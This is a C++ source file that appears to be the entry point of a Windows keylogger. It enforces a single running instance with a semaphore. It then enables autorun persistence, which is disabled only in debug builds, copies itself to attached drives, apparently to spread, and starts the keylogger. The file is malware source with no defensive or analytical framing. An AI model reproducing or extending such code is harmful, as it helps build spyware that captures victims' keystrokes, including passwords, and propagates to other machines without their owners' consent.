#include "stdafx.h"
#include "Keylogger.h"
#include "Settings.h"
#include "Installer.h"


TCHAR semName[] = V_UNIQUE_ID;

extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	HANDLE hSem = CreateSemaphore(NULL, 1, 1, semName);
	if (WaitForSingleObject(hSem, 0) == WAIT_TIMEOUT)
	{
		Error(_T("Already running"));
		CloseHandle(hSem);
		return 0;
	}

	installer.SetAutorun(true);
#ifdef _DEBUG
	installer.SetAutorun(false);
#endif
	installer.InstallOnDrives();
	keylogger.Run();

	CloseHandle(hSem);
	return 0;
}
